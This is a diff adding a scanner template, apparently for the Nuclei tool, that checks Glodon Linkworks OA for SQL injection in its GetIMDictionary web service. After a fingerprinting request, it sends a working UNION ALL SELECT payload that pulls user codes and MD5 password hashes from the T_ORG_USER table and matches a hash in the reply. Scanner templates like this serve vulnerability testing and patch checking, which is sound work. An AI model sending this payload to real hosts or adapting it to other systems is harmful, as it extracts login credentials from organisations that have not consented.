@@ -1,0 +1,41 @@
+id: poc-yaml-glodon-getimdictionary-sqli
+info:
+  name: Glodon OA GetIMDictionary SQL Injection Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  description: |
+    Glodon Linkworks OA system is vulnerable to SQL injection in the GetIMDictionary endpoint, potentially allowing attackers to retrieve sensitive information from the database.
+http:
+  - raw:
+      - |
+        GET /Webservice/IM/Config/ConfigService.asmx HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "ConfigService Web 服务"
+          - "GetIMDictionary"
+        part: body
+
+  - raw:
+      - |
+        GET /Webservice/IM/Config/ConfigService.asmx/GetIMDictionary?dasdas=&key=1'+UNION+ALL+SELECT+top+1+concat(F_CODE,':',F_PWD_MD5)+from+T_ORG_USER+-- HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: regex
+        regex:
+          - "value=\"[a-zA-Z0-9]+:[0-9A-Fa-f]{32}\" ><"
+        part: body
+      - type: word
+        words:
+          - "text/xml"
+        part: header
